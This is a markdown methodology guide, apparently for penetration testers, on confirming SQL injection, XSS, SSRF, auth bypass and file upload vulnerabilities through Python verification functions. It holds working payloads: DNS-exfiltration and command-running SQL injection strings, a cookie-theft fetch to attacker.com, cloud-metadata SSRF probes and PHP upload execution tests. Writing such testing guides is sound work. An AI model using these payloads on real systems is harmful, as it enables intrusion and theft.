# VULNERABILITY-SPECIFIC VERIFICATION

This document provides verification methods for each vulnerability type to avoid false positives.

## Core Principle

```
Every vulnerability type has specific false positive scenarios.
Know them. Test for them. Verify actual impact.
```

---

## SQL Injection

### False Positive Scenarios

| Scenario | Appearance | Reality |
|----------|------------|---------|
| WAF Silent Filter | HTTP 200 | Payload stripped/encoded |
| Parameterized Query | Empty result | Query safe, no injection |
| Error Caught | HTTP 200 | Exception handled silently |
| Database Timeout | Slow response | Network issue, not SQLi |
| Input Validation | Error message | Validation, not SQLi error |

### Verification Methods

#### 1. Boolean Blind Verification

```python
def verify_sqli_boolean(url, param, injection_point):
    """
    Compare true vs false condition responses.
    Difference in length/content = SQLi confirmed.
    """
    payload_true = f"{injection_point}' AND '1'='1"
    payload_false = f"{injection_point}' AND '1'='2"

    resp_true = request(url, {param: payload_true})
    resp_false = request(url, {param: payload_false})

    # Check multiple indicators
    length_diff = abs(len(resp_true.text) - len(resp_false.text))
    content_diff = resp_true.text != resp_false.text

    if length_diff > 50 or content_diff:
        return {
            "confidence": "CONFIRMED",
            "evidence": {
                "true_length": len(resp_true.text),
                "false_length": len(resp_false.text),
                "difference": length_diff
            }
        }
    return {"confidence": "UNLIKELY", "reason": "No boolean difference"}
```

#### 2. Time Blind Verification

```python
def verify_sqli_time(url, param, injection_point, delay=5):
    """
    Inject time delay and measure actual response time.
    Delay must be significantly longer than normal.
    """
    # Baseline
    start = time.time()
    request(url, {param: injection_point})
    baseline = time.time() - start

    # Payloads for different databases
    payloads = {
        "mysql": f"{injection_point}' AND SLEEP({delay})--",
        "mssql": f"{injection_point}'; WAITFOR DELAY '0:0:{delay}'--",
        "postgres": f"{injection_point}'; SELECT pg_sleep({delay})--",
        "oracle": f"{injection_point}' AND DBMS_LOCK.SLEEP({delay})--"
    }

    for db, payload in payloads.items():
        start = time.time()
        request(url, {param: payload})
        elapsed = time.time() - start

        # Must be significantly longer than baseline
        if elapsed >= delay - 0.5 and elapsed > baseline * 2:
            return {
                "confidence": "CONFIRMED",
                "database": db,
                "evidence": {
                    "baseline": baseline,
                    "delayed": elapsed,
                    "expected_delay": delay
                }
            }

    return {"confidence": "UNLIKELY", "reason": "No time delay observed"}
```

#### 3. Out-of-Band Verification

```python
def verify_sqli_oob(url, param, injection_point, callback_domain):
    """
    Trigger DNS/HTTP callback from database server.
    Callback received = CONFIRMED.
    """
    unique_id = generate_uuid()

    # DNS exfiltration payloads
    payloads = {
        "mysql": f"{injection_point}' AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.','{unique_id}.{callback_domain}\\\\a'))--",
        "mssql": f"{injection_point}'; EXEC master..xp_dirtree '//{unique_id}.{callback_domain}/a'--",
        "postgres": f"{injection_point}'; COPY (SELECT '') TO PROGRAM 'nslookup {unique_id}.{callback_domain}'--"
    }

    for db, payload in payloads.items():
        request(url, {param: payload})

    # Check callback server
    time.sleep(5)
    if check_callback_received(unique_id, callback_domain):
        return {"confidence": "CONFIRMED", "method": "OOB callback"}

    return {"confidence": "POSSIBLE", "reason": "No callback, may be filtered"}
```

#### 4. Data Extraction Verification

```python
def verify_sqli_extraction(url, param, injection_point):
    """
    Actually extract data to confirm exploitability.
    """
    # UNION-based extraction
    union_payloads = [
        f"{injection_point}' UNION SELECT NULL,@@version,NULL--",
        f"{injection_point}' UNION SELECT NULL,user(),NULL--",
        f"{injection_point}' UNION SELECT NULL,database(),NULL--"
    ]

    for payload in union_payloads:
        resp = request(url, {param: payload})

        # Look for version strings, usernames, etc.
        patterns = [
            r"MySQL|MariaDB|PostgreSQL|Oracle|Microsoft SQL",
            r"\d+\.\d+\.\d+",
            r"root@|admin|dbo|postgres"
        ]

        for pattern in patterns:
            if re.search(pattern, resp.text, re.I):
                return {
                    "confidence": "CONFIRMED",
                    "evidence": {"extracted": re.findall(pattern, resp.text)}
                }

    return {"confidence": "PROBABLE", "reason": "Union works but no data extracted"}
```

---

## XSS (Cross-Site Scripting)

### False Positive Scenarios

| Scenario | Appearance | Reality |
|----------|------------|---------|
| Stored but Encoded | Payload visible in source | Output encoding active |
| CSP Blocks | Script in DOM | Content-Security-Policy prevents execution |
| Browser Filter | Works in interceptor | XSS Auditor/filter blocks |
| Sanitizer Active | Payload accepted | Sanitized on output |
| Different Context | Works in response | Not rendered in browser context |

### Verification Methods

#### 1. DOM Inspection

```python
def verify_xss_dom(browser, url, payload):
    """
    Check if payload appears unencoded in rendered DOM.
    """
    # Navigate with payload
    browser.goto(f"{url}?input={quote(payload)}")

    # Get rendered DOM (not source)
    dom = browser.execute_script("return document.body.innerHTML")

    # Check for unencoded payload
    if payload in dom:
        return {
            "confidence": "PROBABLE",
            "evidence": {"payload_in_dom": True}
        }

    # Check for encoded versions
    encoded_variants = [
        html.escape(payload),
        quote(payload),
        payload.replace("<", "&lt;").replace(">", "&gt;")
    ]

    for variant in encoded_variants:
        if variant in dom:
            return {
                "confidence": "SAFE",
                "reason": "Payload is encoded"
            }

    return {"confidence": "SAFE", "reason": "Payload not found"}
```

#### 2. Script Execution Verification

```python
def verify_xss_execution(browser, url, payload):
    """
    Verify script actually executes in browser.
    """
    # Set up execution marker
    marker = f"xss_confirmed_{generate_uuid()}"
    exec_payload = f"<script>window.{marker}=true</script>"

    browser.goto(f"{url}?input={quote(exec_payload)}")

    # Check if script executed using browser API
    result = browser.execute_script(f"return window.{marker}")

    if result == True:
        return {"confidence": "CONFIRMED", "evidence": {"executed": True}}

    return {"confidence": "POSSIBLE", "reason": "Script not executed"}
```

#### 3. CSP Analysis

```python
def verify_xss_csp(url):
    """
    Check CSP headers for script restrictions.
    """
    resp = request(url)
    csp = resp.headers.get("Content-Security-Policy", "")

    risky_directives = {
        "'unsafe-inline'": "Inline scripts allowed",
        "'unsafe-eval'": "Dynamic code execution allowed",
        "data:": "Data URIs allowed",
        "*": "Wildcard sources"
    }

    for directive, risk in risky_directives.items():
        if directive in csp:
            return {
                "csp_weaknesses": risk,
                "exploitability": "HIGHER"
            }

    if "script-src" in csp and "'unsafe-inline'" not in csp:
        return {
            "csp_blocks_inline": True,
            "exploitability": "LOWER"
        }

    if not csp:
        return {"csp_missing": True, "exploitability": "HIGHEST"}
```

#### 4. Impact Verification

```python
def verify_xss_impact(browser, url, payload):
    """
    Verify actual impact (cookie theft, etc.)
    """
    # Cookie theft payload
    callback_url = f"https://attacker.com/log?c="
    theft_payload = f"<script>fetch('{callback_url}'+document.cookie)</script>"

    # Check if HttpOnly cookies exist
    browser.goto(url)
    cookies = browser.cookies()

    httponly_cookies = [c for c in cookies if c.get("httpOnly")]
    accessible_cookies = [c for c in cookies if not c.get("httpOnly")]

    return {
        "httponly_protected": len(httponly_cookies),
        "potentially_stealable": len(accessible_cookies),
        "impact": "HIGH" if accessible_cookies else "LIMITED"
    }
```

---

## SSRF (Server-Side Request Forgery)

### False Positive Scenarios

| Scenario | Appearance | Reality |
|----------|------------|---------|
| URL Stored Only | URL accepted | Never fetched server-side |
| Response Not Returned | Request sent | Can't see response |
| DNS Rebinding Protection | Request blocked | Server validates IP |
| Allowlist Active | Request sent | Only allowed domains work |
| Async Processing | Accepted | Processed later, may fail |

### Verification Methods

#### 1. Callback Verification

```python
def verify_ssrf_callback(url, param, callback_server):
    """
    Most reliable: trigger callback to controlled server.
    """
    unique_id = generate_uuid()
    callback_url = f"http://{unique_id}.{callback_server}/ssrf-test"

    # Send request with callback URL
    request(url, {param: callback_url})

    # Wait and check
    time.sleep(5)

    if check_callback_received(unique_id, callback_server):
        callback_details = get_callback_details(unique_id)
        return {
            "confidence": "CONFIRMED",
            "evidence": {
                "callback_received": True,
                "source_ip": callback_details.get("source_ip"),
                "headers": callback_details.get("headers")
            }
        }

    return {"confidence": "POSSIBLE", "reason": "No callback received"}
```

#### 2. Internal Service Probing

```python
def verify_ssrf_internal(url, param):
    """
    Probe common internal services.
    """
    internal_targets = [
        ("http://169.254.169.254/latest/meta-data/", "AWS Metadata"),
        ("http://metadata.google.internal/", "GCP Metadata"),
        ("http://localhost:6379/info", "Redis"),
        ("http://localhost:9200/", "Elasticsearch"),
        ("http://127.0.0.1:80/", "Local web server")
    ]

    results = []
    for target, service in internal_targets:
        resp = request(url, {param: target})

        # Check for service-specific responses
        indicators = {
            "AWS Metadata": ["ami-id", "instance-id", "iam"],
            "GCP Metadata": ["project", "zone", "attributes"],
            "Redis": ["redis_version", "connected_clients"],
            "Elasticsearch": ["cluster_name", "lucene_version"]
        }

        for indicator in indicators.get(service, []):
            if indicator in resp.text.lower():
                results.append({
                    "target": target,
                    "service": service,
                    "confirmed": True
                })

    if results:
        return {"confidence": "CONFIRMED", "internal_access": results}

    return {"confidence": "POSSIBLE", "reason": "No internal service response"}
```

#### 3. Response Timing Analysis

```python
def verify_ssrf_timing(url, param):
    """
    Compare timing for internal vs external targets.
    """
    external_url = "http://example.com/"
    internal_urls = [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://192.168.1.1/",
        "http://10.0.0.1/"
    ]

    # External baseline
    start = time.time()
    request(url, {param: external_url})
    external_time = time.time() - start

    # Internal probes
    for internal in internal_urls:
        start = time.time()
        request(url, {param: internal})
        internal_time = time.time() - start

        # Faster response may indicate internal network access
        if internal_time < external_time * 0.5:
            return {
                "confidence": "PROBABLE",
                "evidence": {
                    "target": internal,
                    "internal_time": internal_time,
                    "external_time": external_time
                }
            }

    return {"confidence": "UNLIKELY"}
```

---

## Authentication Bypass

### False Positive Scenarios

| Scenario | Appearance | Reality |
|----------|------------|---------|
| Public Data | Data returned | Intentionally public |
| Cached Response | Auth-like data | CDN/cache serving stale |
| Empty Session | Token accepted | Session has no permissions |
| Rate Limited | Success then fail | Rate limiting kicked in |
| Different Scope | Access granted | Limited scope, not bypass |

### Verification Methods

#### 1. Compare Auth vs Unauth

```python
def verify_auth_bypass(url, auth_token=None):
    """
    Compare responses with and without authentication.
    """
    # Request without auth
    resp_unauth = request(url)

    # Request with auth
    headers = {"Authorization": f"Bearer {auth_token}"} if auth_token else {}
    resp_auth = request(url, headers=headers)

    # If unauth gets same sensitive data as auth = bypass
    if resp_unauth.text == resp_auth.text and len(resp_auth.text) > 100:
        # Check if data is actually sensitive
        sensitive_patterns = [
            r"email.*@",
            r"password|secret|token|key",
            r"ssn|credit.?card|account.?number",
            r"private|internal|admin"
        ]

        for pattern in sensitive_patterns:
            if re.search(pattern, resp_unauth.text, re.I):
                return {
                    "confidence": "CONFIRMED",
                    "evidence": {"sensitive_data_unauth": True}
                }

    # If unauth gets more/different data than auth = suspicious
    if len(resp_unauth.text) > len(resp_auth.text):
        return {
            "confidence": "POSSIBLE",
            "reason": "Unauth response larger than auth"
        }

    return {"confidence": "SAFE"}
```

#### 2. Privilege Action Verification

```python
def verify_auth_privilege(url, low_priv_token, high_priv_action):
    """
    Try privileged action with low-privilege token.
    """
    # Get current state
    before_state = get_resource_state(url)

    # Attempt privileged action
    headers = {"Authorization": f"Bearer {low_priv_token}"}
    resp = request(url, method="POST", headers=headers, data=high_priv_action)

    # Check state after
    after_state = get_resource_state(url)

    if before_state != after_state:
        return {
            "confidence": "CONFIRMED",
            "evidence": {
                "action_succeeded": True,
                "before": before_state,
                "after": after_state
            }
        }

    if resp.status_code == 200:
        return {
            "confidence": "PROBABLE",
            "reason": "200 OK but state unchanged"
        }

    return {"confidence": "SAFE"}
```

---

## File Upload

### False Positive Scenarios

| Scenario | Appearance | Reality |
|----------|------------|---------|
| Antivirus Deleted | Upload succeeded | AV deleted after upload |
| Extension Renamed | .php accepted | Renamed to .php.txt |
| Content Sanitized | File stored | Malicious content stripped |
| Isolated Storage | Accessible URL | Served from isolated CDN |
| No Direct Access | Upload worked | Can't reach uploaded file |

### Verification Methods

#### 1. Download and Compare

```python
def verify_upload_integrity(upload_url, download_url, original_content):
    """
    Upload file and verify content preserved.
    """
    # Upload
    files = {"file": ("test.php", original_content, "application/x-php")}
    resp = request(upload_url, method="POST", files=files)

    if resp.status_code != 200:
        return {"confidence": "SAFE", "reason": "Upload rejected"}

    # Download and compare
    time.sleep(2)  # Wait for processing
    downloaded = request(download_url)

    if downloaded.text == original_content:
        return {
            "confidence": "CONFIRMED",
            "evidence": {"content_preserved": True}
        }

    if len(downloaded.text) < len(original_content) * 0.5:
        return {
            "confidence": "SAFE",
            "reason": "Content significantly modified"
        }

    return {"confidence": "PROBABLE", "reason": "Content partially preserved"}
```

#### 2. Execution Verification

```python
def verify_upload_execution(upload_url, base_url):
    """
    Upload executable and verify it runs.
    """
    marker = generate_uuid()

    # PHP execution test
    php_content = f"<?php echo '{marker}'; ?>"
    files = {"file": ("test.php", php_content, "application/x-php")}

    upload_resp = request(upload_url, method="POST", files=files)

    if upload_resp.status_code != 200:
        return {"confidence": "SAFE", "reason": "Upload rejected"}

    # Try to access uploaded file
    possible_paths = [
        f"{base_url}/uploads/test.php",
        f"{base_url}/files/test.php",
        f"{base_url}/media/test.php"
    ]

    for path in possible_paths:
        resp = request(path)
        if marker in resp.text:
            return {
                "confidence": "CONFIRMED",
                "evidence": {
                    "executed": True,
                    "path": path
                }
            }

    return {"confidence": "POSSIBLE", "reason": "Uploaded but can't verify execution"}
```

#### 3. Content-Type Verification

```python
def verify_upload_contenttype(url, uploaded_path):
    """
    Check how server serves uploaded file.
    """
    resp = request(uploaded_path, method="HEAD")

    content_type = resp.headers.get("Content-Type", "")
    content_disposition = resp.headers.get("Content-Disposition", "")

    dangerous_types = [
        "text/html",
        "application/javascript",
        "application/x-php",
        "text/xml"
    ]

    if content_type in dangerous_types:
        return {
            "confidence": "CONFIRMED",
            "risk": "XSS/RCE via content-type",
            "content_type": content_type
        }

    if "attachment" in content_disposition:
        return {
            "confidence": "SAFE",
            "reason": "Forced download, no inline rendering"
        }

    return {"confidence": "PROBABLE"}
```

---

## Quick Reference Table

| Vulnerability | Primary Verification | Secondary Verification | OOB Verification |
|---------------|---------------------|------------------------|------------------|
| SQLi | Boolean blind diff | Time delay | DNS callback |
| XSS | DOM inspection | Script execution | Cookie theft callback |
| SSRF | Callback received | Internal response | Timing analysis |
| Auth Bypass | Privilege action | Data comparison | N/A |
| File Upload | Download content | Execution test | Callback from uploaded file |

---

## Integration

This document integrates with:
- [Deep Verification](./DEEP_VERIFICATION.md) - Universal 5-step flow
- [Confidence System](./CONFIDENCE_SYSTEM.md) - Scoring methodology
- [IDOR Verification](../auth-testing/IDOR.md#write-operation-verification-critical)
